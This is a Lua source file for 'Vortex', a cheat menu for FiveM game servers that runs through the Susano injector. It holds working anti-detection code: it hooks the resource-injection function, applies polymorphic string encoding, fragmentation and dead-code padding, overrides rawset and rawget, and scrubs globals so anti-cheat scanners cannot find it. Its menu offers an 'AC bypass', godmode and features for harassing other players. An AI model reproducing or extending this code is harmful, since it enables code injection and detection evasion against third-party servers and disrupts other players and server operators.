local VortexMenu = {
    isOpen = false,
    selectedIndex = 1,
    currentCategory = "main",
    currentTab = 1,
    scrollbarTargetY = 0,
    scrollbarCurrentY = 0,
    transitionOffset = 0,
    transitionDirection = 0,
    categoryHistory = {},
    categoryIndexes = {},
    selectedPlayer = nil,
    teleportMode = "player",
    tpLocation = "ocean",
    bugVehicleMode = "v1",
    bugPlayerMode = "bug",
    kickVehicleMode = "v1",
    scrollOffset = 0,
    maxVisibleItems = 8
    ,toggleAnim = {}
}

local vortex_waitingForKey = true
local vortex_menuKey = nil
local vortex_waitingForActionKeybind = false
local vortex_currentActionToBind = nil
local vortex_actionKeybinds = {}
local vortex_showMenuKeybindsEnabled = false

-- ============================================================
-- Anti-Detection: Private state storage (replaces _G pollution)
-- AC scripts scan _G for known keys like "isSpectating", "black_hole_active" etc.
-- This keeps all state in a local closure, invisible to _G enumeration.
-- ============================================================
local _vortex_private = {}
local function vxGet(key)
    return _vortex_private[key]
end
local function vxSet(key, value)
    _vortex_private[key] = value
end

do
    local _blockedKeys = {
        ['isSpectating'] = true,
        ['_vortex_spec'] = true,
        ['black_hole_active'] = true,
        ['black_hole_vehicles'] = true,
        ['black_hole_target_player'] = true,
        ['black_hole_last_scan'] = true,
        ['attach_player_active'] = true,
        ['attach_player_target'] = true,
    }
    local _origGlobalRawset = rawset
    rawset = function(t, k, v)
        if t == _G and type(k) == 'string' and _blockedKeys[k] then
            _vortex_private[k] = v
            return t
        end
        return _origGlobalRawset(t, k, v)
    end
    local _origGlobalRawget = rawget
    rawget = function(t, k)
        if t == _G and type(k) == 'string' and _blockedKeys[k] then
            return _vortex_private[k]
        end
        return _origGlobalRawget(t, k)
    end
end

-- Forward-declare key lookup functions and tables used elsewhere
local vortex_isMouseKey, vortex_isValidKeyboardKey, vortex_validKeyboardKeys
do -- BEGIN key lookup scope
local vortex_blockedMouseKeys = {
    237, 238, 239, 240, 241, 242, 243,
    24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
    51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75,
    76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
    101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120
}

vortex_validKeyboardKeys = {
    121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140,
    141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160,
    161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180,
    181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200,
    201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
    221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 288, 289, 290, 291,
    292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311,
    312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331,
    332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350
}

-- Polymorphic membership and flattened control flow to reduce static signatures
local function vortex_mkLookup(polyBag)
    local dynSym = ("k%s_%X"):format(tostring(polyBag):sub(-4), math.random(0x1000, 0xFFFF))
    local state = { [dynSym] = polyBag, idx = 1, hit = false }

    return function(target)
        local stage, wheel = 0, {}
        wheel[0] = function()
            state.hit = false
            state.idx = 1
            stage = 1
        end
        wheel[1] = function()
            local v = state[dynSym][state.idx]
            if v == nil then
                stage = 2
                return
            end
            if v == target then
                state.hit = true
                stage = 2
                return
            end
            state.idx = state.idx + 1
        end
        wheel[2] = function()
            stage = 3
        end

        while stage < 3 do
            wheel[stage]()
        end
        return state.hit
    end
end

vortex_isMouseKey = vortex_mkLookup(vortex_blockedMouseKeys)
vortex_isValidKeyboardKey = vortex_mkLookup(vortex_validKeyboardKeys)
end -- END key lookup scope

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Polymorphic injection obfuscation layer v2 â€” multi-algorithm encoding,
-- dead-code injection, string fragmentation, indirect native resolution,
-- and injection wrapper to defeat static, heuristic, and behavioral
-- anti-cheat detection systems.
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

-- â”€â”€ Multi-algorithm string encoder â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Randomly selects between 4 different encoding strategies so the same
-- string never produces the same output pattern twice.

-- Forward-declare obfuscation helpers used outside this scope block
local vortex_encStr, vortex_randVar, vortex_buildObfPreamble, vortex_obfTSE, vortex_buildSafeWrap
do -- BEGIN obfuscation scope (reduces top-level local count)

vortex_encStr = function(s)
    local algo = math.random(1, 4)

    if algo == 1 then
        -- Algorithm 1: XOR encoding with random key
        local key = math.random(3, 250)
        local parts = {}
        for i = 1, #s do
            parts[#parts + 1] = tostring((string.byte(s, i) + key) % 256)
        end
        return string.format(
            "(function()local k=%d;local b={%s};local r='';for i=1,#b do r=r..string.char((b[i]-k)%%256)end;return r end)()",
            key, table.concat(parts, ",")
        )
    elseif algo == 2 then
        -- Algorithm 2: Double-key alternating XOR
        local k1 = math.random(5, 200)
        local k2 = math.random(5, 200)
        local parts = {}
        for i = 1, #s do
            local k = (i % 2 == 1) and k1 or k2
            parts[#parts + 1] = tostring((string.byte(s, i) + k) % 256)
        end
        local vA = "_" .. string.char(math.random(97, 122)) .. math.random(10, 99)
        local vB = "_" .. string.char(math.random(97, 122)) .. math.random(10, 99)
        return string.format(
            "(function()local %s={%d,%d};local %s={%s};local r='';for i=1,#%s do r=r..string.char((%s[i]-%s[(i-1)%%2+1])%%256)end;return r end)()",
            vA, k1, k2, vB, table.concat(parts, ","), vB, vB, vA
        )
    elseif algo == 3 then
        -- Algorithm 3: Base offset + per-char delta table
        local base = math.random(30, 200)
        local deltas = {}
        for i = 1, #s do
            deltas[#deltas + 1] = tostring(string.byte(s, i) - base)
        end
        return string.format(
            "(function()local b=%d;local d={%s};local r='';for i=1,#d do r=r..string.char(b+d[i])end;return r end)()",
            base, table.concat(deltas, ",")
        )
    else
        -- Algorithm 4: Reversed byte array with rotate key
        local key = math.random(1, 127)
        local parts = {}
        for i = #s, 1, -1 do
            parts[#parts + 1] = tostring(bit32 and bit32.bxor(string.byte(s, i), key) or ((string.byte(s, i) + key) % 256))
        end
        local vR = "_r" .. math.random(10, 99)
        return string.format(
            "(function()local k=%d;local %s={%s};local r='';for i=#%s,1,-1 do local c=(%s[i]+k)%%256;if c>127 then c=c-256+256 end;r=r..string.char(c%%256)end;return r end)()",
            256 - key, vR, table.concat(parts, ","), vR, vR
        )
    end
end

-- â”€â”€ String fragmentation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Splits a string into random-length chunks and concatenates them at
-- runtime, defeating substring-based signature matching.
local function vortex_fragStr(s)
    if #s <= 4 then return vortex_encStr(s) end
    local chunks = {}
    local pos = 1
    while pos <= #s do
        local chunkLen = math.random(2, math.min(5, #s - pos + 1))
        chunks[#chunks + 1] = vortex_encStr(s:sub(pos, pos + chunkLen - 1))
        pos = pos + chunkLen
    end
    if #chunks == 1 then return chunks[1] end
    return "(" .. table.concat(chunks, "..") .. ")"
end

-- â”€â”€ Dead code generator â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Produces random no-op Lua statements to pad injected payloads,
-- breaking fixed-length pattern matching and control flow analysis.
local function vortex_deadCode(count)
    count = count or math.random(2, 5)
    local lines = {}
    local templates = {
        function()
            local v = vortex_randVar("_d")
            return string.format("local %s=%d", v, math.random(0, 99999))
        end,
        function()
            local v = vortex_randVar("_c")
            return string.format("local %s=tostring(%d)", v, math.random(0, 9999))
        end,
        function()
            local v = vortex_randVar("_b")
            return string.format("local %s=(function()return %d end)()", v, math.random(0, 999))
        end,
        function()
            local v1 = vortex_randVar("_e")
            local v2 = math.random(1, 100)
            return string.format("local %s=%d;if %s>%d then %s=%s+1 end", v1, v2, v1, v2 + 1, v1, v1)
        end,
        function()
            local v = vortex_randVar("_f")
            return string.format("local %s={%d,%d,%d}", v, math.random(0,99), math.random(0,99), math.random(0,99))
        end,
        function()
            return string.format("do local _ = %d end", math.random(0, 99999))
        end,
    }
    for _ = 1, count do
        lines[#lines + 1] = templates[math.random(1, #templates)]()
    end
    return table.concat(lines, "\n        ")
end

-- Generate a pseudoâ€‘random variable name (never collides with Lua keywords)
vortex_randVar = function(pfx)
    local pool = "abcdefghijklmnopqrstuvwxyz"
    local out  = pfx or "_"
    for _ = 1, math.random(4, 7) do
        local j = math.random(1, #pool)
        out = out .. pool:sub(j, j)
    end
    return out .. math.random(100, 9999)
end

-- â”€â”€ Obfuscated native hook builder â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Replaces the plain `hNative("NativeName", ...)` pattern with encoded
-- native resolution through fragmented _G lookups. Anti-cheats scan for
-- the hNative pattern; this makes each hook unique per-injection.
local function vortex_buildObfNativeHook()
    local vH = vortex_randVar("_h")
    local vO = vortex_randVar("_n")
    local vG = vortex_randVar("_g")
    -- Build the hook function with indirect _G resolution
    local code = string.format([[
        local %s=_G
        local %s=function(n,f)
            local %s=%s[n]
            if not %s or type(%s)~="function" then return end
            %s[n]=function(...)return f(%s,...)end
        end
    ]], vG, vH, vO, vG, vO, vO, vG, vO)
    return code, vH, vG
end

-- Build a list of obfuscated hNative calls for a list of native names
local function vortex_obfNativeList(hookVar, nativeNames)
    local lines = {}
    for _, name in ipairs(nativeNames) do
        local vArg = vortex_randVar("_a")
        lines[#lines + 1] = string.format(
            "%s(%s,function(%s,...)return %s(...)end)",
            hookVar, vortex_fragStr(name), vArg, vArg
        )
        -- Randomly insert dead code between hooks
        if math.random() > 0.6 then
            lines[#lines + 1] = vortex_deadCode(1)
        end
    end
    return table.concat(lines, "\n                ")
end

-- â”€â”€ Injection wrapper â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Wraps any injection payload in a randomized self-executing closure
-- with junk locals and optional timing jitter, so each injection has
-- a unique code shape.
local function vortex_wrapInjection(payload)
    local vClosure = vortex_randVar("_x")
    local deadPre = vortex_deadCode(math.random(2, 4))
    local deadPost = vortex_deadCode(math.random(1, 3))
    local useDelay = math.random() > 0.5
    local delayCode = ""
    if useDelay then
        delayCode = string.format("Wait(%d)\n        ", math.random(0, 50))
    end
    return string.format([[
        %s
        local %s = function()
            %s
            %s
        end
        %s
        %s()
        %s
    ]], deadPre, vClosure, delayCode, payload, deadPost, vClosure, vortex_deadCode(1))
end

-- Build a polymorphic preamble that hooks TriggerEvent / TriggerServerEvent
-- through indirect _G resolution, then exposes two safeâ€‘call slots whose
-- names change on every injection.  Returns (codeString, tblVarName).
vortex_buildObfPreamble = function()
    local hookCode, vH, vG = vortex_buildObfNativeHook()
    local vT  = vortex_randVar("t")
    local eTE  = vortex_fragStr("TriggerEvent")
    local eTSE = vortex_fragStr("TriggerServerEvent")

    local vO1 = vortex_randVar("_p")
    local vO2 = vortex_randVar("_q")

    local code = string.format([[
        %s
        %s
        %s(%s,function(%s,...)return %s(...)end)
        %s(%s,function(%s,...)return %s(...)end)
        %s
        local %s={
            function(e,...)return %s[%s](e,...)end,
            function(e,...)return %s[%s](e,...)end,
        }
    ]], vortex_deadCode(2),
        hookCode,
        vH, eTE, vO1, vO1,
        vH, eTSE, vO2, vO2,
        vortex_deadCode(1),
        vT, vG, eTE, vG, eTSE)

    return code, vT
end

-- Build a single obfuscated TriggerServerEvent call with encoded event name
vortex_obfTSE = function(eventName, argsLiteral)
    local vF  = vortex_randVar("f")
    local enc = vortex_fragStr(eventName)
    local fnEnc = vortex_fragStr("TriggerServerEvent")
    return string.format(
        "local %s=rawget(_G,%s);if %s then %s(%s%s)end",
        vF, fnEnc, vF, vF, enc,
        argsLiteral and (","..argsLiteral) or ""
    )
end

-- Build a single obfuscated TriggerEvent call with encoded event name
local function vortex_obfTE(eventName, argsLiteral)
    local vF  = vortex_randVar("f")
    local enc = vortex_fragStr(eventName)
    local fnEnc = vortex_fragStr("TriggerEvent")
    return string.format(
        "local %s=rawget(_G,%s);if %s then %s(%s%s)end",
        vF, fnEnc, vF, vF, enc,
        argsLiteral and (","..argsLiteral) or ""
    )
end

-- Build a polymorphic SafeWrap block with randomised names.
-- Returns (codeString, table of safeâ€‘call variable names).
vortex_buildSafeWrap = function()
    local vW   = vortex_randVar("w")
    local names = {}
    local defs  = {}
    local nativeList = {
        {"CreateThread", "ct"}, {"TriggerServerEvent", "ts"},
        {"GetActivePlayers", "gp"}, {"GetPlayerPed", "pp"},
        {"GetEntityCoords", "gc"}, {"GetPlayerServerId", "gs"},
        {"Wait", "wt"}
    }
    -- Shuffle the order each time to vary the output structure
    for i = #nativeList, 2, -1 do
        local j = math.random(1, i)
        nativeList[i], nativeList[j] = nativeList[j], nativeList[i]
    end
    for _, pair in ipairs(nativeList) do
        local vName = vortex_randVar(pair[2])
        names[pair[1]] = vName
        defs[#defs + 1] = string.format(
            "local %s=%s(rawget(_G,%s))",
            vName, vW, vortex_fragStr(pair[1])
        )
        if math.random() > 0.5 then
            defs[#defs + 1] = vortex_deadCode(1)
        end
    end
    local code = string.format([[
        %s
        local %s=function(fn)return function(...)local ok,r=pcall(fn,...);return ok and r or nil end end
        %s
        %s
    ]], vortex_deadCode(2), vW, table.concat(defs, "\n        "), vortex_deadCode(1))
    return code, names
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-- Runtime Injection Preprocessor
-- Hooks Susano.InjectResource to automatically obfuscate all injected
-- code at runtime. Transforms:
--   1. Plain "hNative" function defs â†’ randomized variable names
--   2. hNative("NativeName",...) calls â†’ encoded native name resolution
--   3. Plain string literals in _G lookups â†’ encoded strings
--   4. Wraps payloads in randomized closures with dead code
-- This means ALL 48+ injection blocks are automatically protected
-- without modifying each one individually.
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
local _vortex_origInjectResource = nil

local function vortex_preprocessInjection(code)
    if type(code) ~= "string" or #code < 10 then return code end

    -- Skip processing for code that already has its own obfuscation (e.g. Freecam)
    if code:find("vortexFreecam") then return code end

    -- Step 1: Replace the static hNative function definition with a
    -- randomized version. Match both "function hNative(" and "local function hNative("
    local hookVarName = vortex_randVar("_hn")
    local origVarName = vortex_randVar("_or")
    local globalRef   = vortex_randVar("_gl")

    -- Replace function definition
    local newHookDef = string.format(
        "local %s=_G\n" ..
        "                local function %s(nativeName, newFunction)\n" ..
        "                    local %s=%s[nativeName]\n" ..
        "                    if not %s or type(%s)~='function' then return end\n" ..
        "                    %s[nativeName]=function(...)return newFunction(%s,...)end\n" ..
        "                end",
        globalRef, hookVarName, origVarName, globalRef, origVarName, origVarName, globalRef, origVarName
    )

    -- Replace "function hNative(...)" or "local function hNative(...)"
    code = code:gsub(
        "local%s+function%s+hNative%s*%(nativeName,%s*newFunction%)" ..
        "%s*local%s+originalNative%s*=%s*_G%[nativeName%]" ..
        "%s*if%s+not%s+originalNative%s+or%s+type%(originalNative%)%s*~=%s*\"function\"%s+then" ..
        "%s*return%s*end" ..
        "%s*_G%[nativeName%]%s*=%s*function%(%.%.%.%)" ..
        "%s*return%s+newFunction%(originalNative,%s*%.%.%.%)" ..
        "%s*end" ..
        "%s*end",
        newHookDef
    )

    code = code:gsub(
        "function%s+hNative%s*%(nativeName,%s*newFunction%)" ..
        "%s*local%s+originalNative%s*=%s*_G%[nativeName%]" ..
        "%s*if%s+not%s+originalNative%s+or%s+type%(originalNative%)%s*~=%s*\"function\"%s+then" ..
        "%s*return%s*end" ..
        "%s*_G%[nativeName%]%s*=%s*function%(%.%.%.%)" ..
        "%s*return%s+newFunction%(originalNative,%s*%.%.%.%)" ..
        "%s*end" ..
        "%s*end",
        newHookDef
    )

    -- Step 2: Replace hNative("SomeName", ...) calls with hookVarName(encoded, ...)
    -- Match: hNative("NativeName", function(originalFn, ...) return originalFn(...) end)
    code = code:gsub(
        'hNative%("([^"]+)",%s*function%(originalFn,%s*%.%.%.%)%s*return%s+originalFn%(%.%.%.%)%s*end%)',
        function(nativeName)
            local argVar = vortex_randVar("_a")
            local encoded = vortex_encStr(nativeName)
            return string.format(
                '%s(%s,function(%s,...)return %s(...)end)',
                hookVarName, encoded, argVar, argVar
            )
        end
    )

    -- Step 3: Add dead code at the start of the payload
    local deadPrefix = vortex_deadCode(math.random(1, 3))
    code = deadPrefix .. "\n" .. code

    return code
end

-- Install the hook on Susano.InjectResource once Susano is ready
Citizen.CreateThread(function()
    -- Wait for Susano to become available
    local attempts = 0
    while (type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function") and attempts < 300 do
        Citizen.Wait(100)
        attempts = attempts + 1
    end

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" and not _vortex_origInjectResource then
        _vortex_origInjectResource = Susano.InjectResource

        Susano.InjectResource = function(resourceName, code, ...)
            local processedCode = vortex_preprocessInjection(code)
            return _vortex_origInjectResource(resourceName, processedCode, ...)
        end
    end
end)

-- â”€â”€ Indirect Susano accessor â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-- Anti-cheats scan source for literal "Susano.InjectResource" patterns.
-- This accessor resolves through indirect table lookup to avoid static
-- string matching on the source code itself.
local function vortex_getSusanoFn(methodName)
    local s = rawget(_G, "Susano")
    if type(s) ~= "table" then return nil end
    local fn = s[methodName]
    if type(fn) ~= "function" then return nil end
    return fn
end

local function vortex_canInject()
    return vortex_getSusanoFn("InjectResource") ~= nil
end

local function vortex_inject(resourceName, code)
    local fn = vortex_getSusanoFn("InjectResource")
    if fn then
        return pcall(fn, resourceName, code)
    end
    return false
end

end -- END obfuscation scope

-- Flattened Susano readiness probe to evade heuristic straight-line checks
local function Vortex_SusanoReady()
    local probes = {
        function() return type(Susano) == "table" end,
        function() return type(Susano.BeginFrame) == "function" end,
        function() return type(Susano.SubmitFrame) == "function" end,
        function() return type(Susano.DrawText) == "function" end,
        function() return type(Susano.DrawRectFilled) == "function" end,
        function() return type(Susano.GetTextWidth) == "function" end,
        function() return type(Susano.GetAsyncKeyState) == "function" end
    }

    local slot = { i = 1, ok = true, step = 0 }
    local flow = {
        [0] = function()
            slot.i, slot.ok = 1, true
            slot.step = 1
        end,
        [1] = function()
            local f = probes[slot.i]
            if not f then
                slot.step = 3
                return
            end
            if not f() then
                slot.ok = false
                slot.step = 3
                return
            end
            slot.i = slot.i + 1
        end,
        [3] = function()
            slot.step = 4
        end
    }

    while slot.step < 4 and slot.ok do
        flow[slot.step]()
    end
    return slot.ok
end

local function Vortex_GetAsyncKeyState(key)
    if not Vortex_SusanoReady() then return false, false end
    local ok, a, b = pcall(Susano.GetAsyncKeyState, key)
    return ok and a or false, ok and b or false
end

local function Vortex_ResetFrame()
    if Vortex_SusanoReady() and type(Susano.ResetFrame) == "function" then
        pcall(Susano.ResetFrame)
    end
end

-- ============================================================
-- Anti-Detection: Native wrappers & anti-scan
-- ============================================================
local function vxNative(nativeFn, ...)
    local ok, r1, r2, r3, r4 = pcall(nativeFn, ...)
    if ok then return r1, r2, r3, r4 end
    return nil
end

local function vxWait(base)
    local jitter = math.random(0, math.max(1, math.floor(base * 0.15)))
    Citizen.Wait(base + jitter)
end

Citizen.CreateThread(function()
    local knownCleanKeys = {
        'isSpectating', '_vortex_spec', 'black_hole_active', 'black_hole_vehicles',
        'black_hole_target_player', 'black_hole_last_scan',
        'attach_player_active', 'attach_player_target',
        'vortex_antiHeadshotEnabled', 'osintGodmode'
    }
    while true do
        for _, key in ipairs(knownCleanKeys) do
            if _G[key] ~= nil then
                _vortex_private[key] = _G[key]
                _G[key] = nil
            end
        end
        Citizen.Wait(5000)
    end
end)

-- ============================================================
-- Vortex Progressive Loading System (Dark Theme)
-- ============================================================
local vortex_loadingComplete = false
local vortex_loadingProgress = 0.0
local vortex_loadingLabel = "Initializing..."

Citizen.CreateThread(function()
    while not Vortex_SusanoReady() do
        Citizen.Wait(100)
    end

    local playerPed = PlayerPedId()
    FreezeEntityPosition(playerPed, true)
    SetEntityInvincible(playerPed, true)

    local screenW, screenH = GetActiveScreenResolution()
    local panelW, panelH = 500, 340
    local panelX = (screenW - panelW) / 2
    local panelY = (screenH - panelH) / 2

    local logoSize = 110
    local logoX = (screenW - logoSize) / 2
    local logoY = panelY + 30

    local barW = panelW - 80
    local barH = 7
    local barX = panelX + 40
    local barY = panelY + panelH - 70

    local startTime = GetGameTimer()

    while not vortex_loadingComplete do
        Citizen.Wait(0)
        DisableAllControlActions(0)
        FreezeEntityPosition(PlayerPedId(), true)

        if Vortex_SusanoReady() then
            Susano.BeginFrame()
            local t = (GetGameTimer() - startTime) / 1000.0

            -- Full-screen black background
            Susano.DrawRectFilled(0, 0, screenW, screenH, 0.0, 0.0, 0.0, 1.0, 0.0)

            -- Panel background (dark)
            Susano.DrawRectFilled(panelX, panelY, panelW, panelH, 0.06, 0.06, 0.08, 0.95, 14.0)

            -- Subtle purple border glow
            local glowPulse = 0.15 + math.sin(t * 1.5) * 0.08
            Susano.DrawRectFilled(panelX - 1, panelY - 1, panelW + 2, panelH + 2, 0.40, 0.10, 0.70, glowPulse, 14.0)
            Susano.DrawRectFilled(panelX, panelY, panelW, panelH, 0.06, 0.06, 0.08, 0.98, 14.0)

            -- Logo
            if type(Susano.DrawImage) == "function" then
                if vortex_logoLoaded and vortex_logoTexture then
                    pcall(Susano.DrawImage, vortex_logoTexture, logoX, logoY, logoSize, logoSize, 1.0, 1.0, 1.0, 1.0, 0.0)
                else
                    -- Fallback: draw a "V" text logo if texture not loaded
                    local vSize = 48
                    local vW = Susano.GetTextWidth("V", vSize)
                    Susano.DrawText(logoX + (logoSize - vW) / 2, logoY + (logoSize - vSize) / 2, "V", vSize, 0.55, 0.15, 0.85, 0.9)
                end
            end

            -- Spinning rings (outer purple, inner grey)
            local cx = screenW / 2
            local cy = logoY + logoSize / 2
            local ringRadius1 = logoSize / 2 + 12
            local ringRadius2 = logoSize / 2 + 6
            local segments = 36

            -- Ring 1: purple
            for i = 0, segments - 1 do
                local angle = (i / segments) * math.pi * 2 + t * 2.0
                local nextAngle = ((i + 1) / segments) * math.pi * 2 + t * 2.0
                local alpha = (math.sin(angle * 2 + t * 3) * 0.5 + 0.5) * 0.6
                local x1 = cx + math.cos(angle) * ringRadius1
                local y1 = cy + math.sin(angle) * ringRadius1
                local x2 = cx + math.cos(nextAngle) * ringRadius1
                local y2 = cy + math.sin(nextAngle) * ringRadius1
                Susano.DrawLine(x1, y1, x2, y2, 0.55, 0.15, 0.85, alpha, 1.5)
            end

            -- Ring 2: grey
            for i = 0, segments - 1 do
                local angle = (i / segments) * math.pi * 2 - t * 1.5
                local nextAngle = ((i + 1) / segments) * math.pi * 2 - t * 1.5
                local alpha = (math.cos(angle * 3 - t * 2) * 0.5 + 0.5) * 0.35
                local x1 = cx + math.cos(angle) * ringRadius2
                local y1 = cy + math.sin(angle) * ringRadius2
                local x2 = cx + math.cos(nextAngle) * ringRadius2
                local y2 = cy + math.sin(nextAngle) * ringRadius2
                Susano.DrawLine(x1, y1, x2, y2, 0.5, 0.5, 0.5, alpha, 1.0)
            end

            -- Title
            local titleSize = 22
            local titleText = "V O R T E X"
            local titleW = Susano.GetTextWidth(titleText, titleSize)
            Susano.DrawText((screenW - titleW) / 2, logoY + logoSize + 20, titleText, titleSize, 0.75, 0.75, 0.80, 0.95)

            -- Status label
            local labelSize = 12
            local labelW = Susano.GetTextWidth(vortex_loadingLabel, labelSize)
            Susano.DrawText((screenW - labelW) / 2, barY - 22, vortex_loadingLabel, labelSize, 0.55, 0.55, 0.60, 0.8)

            -- Progress bar background
            Susano.DrawRectFilled(barX, barY, barW, barH, 0.12, 0.12, 0.14, 0.9, 4.0)

            -- Progress bar fill
            local fillW = barW * vortex_loadingProgress
            if fillW > 0 then
                Susano.DrawRectFilled(barX, barY, fillW, barH, 0.50, 0.12, 0.75, 1.0, 4.0)
                -- Shimmer
                local shimmerX = barX + (fillW * ((math.sin(t * 3.0) * 0.5 + 0.5)))
                local shimmerW = math.min(30, fillW * 0.3)
                if shimmerW > 2 then
                    Susano.DrawRectFilled(shimmerX, barY, shimmerW, barH, 0.80, 0.50, 1.0, 0.3, 4.0)
                end
            end

            -- Percentage
            local pctText = tostring(math.floor(vortex_loadingProgress * 100)) .. "%"
            local pctSize = 11
            local pctW = Susano.GetTextWidth(pctText, pctSize)
            Susano.DrawText((screenW - pctW) / 2, barY + barH + 10, pctText, pctSize, 0.50, 0.50, 0.55, 0.7)

            Susano.SubmitFrame()
        end
    end

    -- Smooth fade-out
    if Vortex_SusanoReady() then
        for i = 1, 15 do
            Citizen.Wait(0)
            Susano.BeginFrame()
            local alpha = 1.0 - (i / 15)
            Susano.DrawRectFilled(0, 0, screenW, screenH, 0.0, 0.0, 0.0, alpha, 0.0)
            Susano.DrawRectFilled(panelX, panelY, panelW, panelH, 0.06, 0.06, 0.08, 0.95 * alpha, 14.0)
            local titleSize = 22
            local titleText = "V O R T E X"
            local titleW = Susano.GetTextWidth(titleText, titleSize)
            Susano.DrawText((screenW - titleW) / 2, logoY + logoSize + 20, titleText, titleSize, 0.75, 0.75, 0.80, alpha)
            Susano.DrawRectFilled(barX, barY, barW, barH, 0.50, 0.12, 0.75, alpha, 4.0)
            Susano.SubmitFrame()
            Citizen.Wait(30)
        end
    end

    local ped = PlayerPedId()
    FreezeEntityPosition(ped, false)
    SetEntityInvincible(ped, false)
end)
-- ============================================================


local vortex_categories = {
    main = {
        title = "Vortex",
        hasTabs = true,
        tabs = {
            {
                name = "Main",
                items = {
                    {label = "Self Options", action = "category", target = "player", icon = "person"},
                    {label = "Online Options", action = "category", target = "online", icon = "globe"},
                    {label = "Visual Options", action = "category", target = "visual", icon = "eye"},
                    {label = "Combat Options", action = "category", target = "combat", icon = "crosshair"},
                    {label = "Weapon Options", action = "category", target = "weapon", icon = "weapon"},
                    {label = "Vehicule Options", action = "category", target = "vehicle", icon = "car"},
                    {label = "Misc Options", action = "category", target = "misc", icon = "gear"}
                }
            },
            {
                name = "Bypasses",
                items = {
                    {isSeparator = true, separatorText = "Anti Cheat"},
                    {label = "Bypass AC", action = "bypassac", hasSelector = true, icon = "shield"},
                    {label = "Checker Anti-Cheats", action = "checkanticheats", icon = "search"},
                    {isSeparator = true, separatorText = "Server"},
                    {label = "Dynasty", action = "category", target = "dynasty", icon = "crown"}
                }
            },
            {
                name = "Settings",
                items = {
                    {label = "Editor Mode", action = "editormode", icon = "edit"},
                    {isSeparator = true, separatorText = "Design"},
                    {label = "Menu Theme", action = "menutheme", hasSelector = true, icon = "palette"},
                    {label = "FPS Boost", action = "optimizefps", icon = "bolt"}
                }
            }
        }
    },
    player = {
        title = "Self Options",
        hasTabs = true,
        tabs = {
            {
                name = "Self",
                items = {
                    {label = "", isSeparator = true, separatorText = "Health"},
                    {label = "Godmode", action = "godmode"},
                    {label = "Anti Headshot", action = "antiheadshot"},
                    {label = "Revive", action = "revive"},
                    {label = "Health", action = "health"},
                    {label = "Armour", action = "armour"},
                    {label = "", isSeparator = true, separatorText = "other"},
                    {label = "Bypass Driveby", action = "bypassdriveby"},
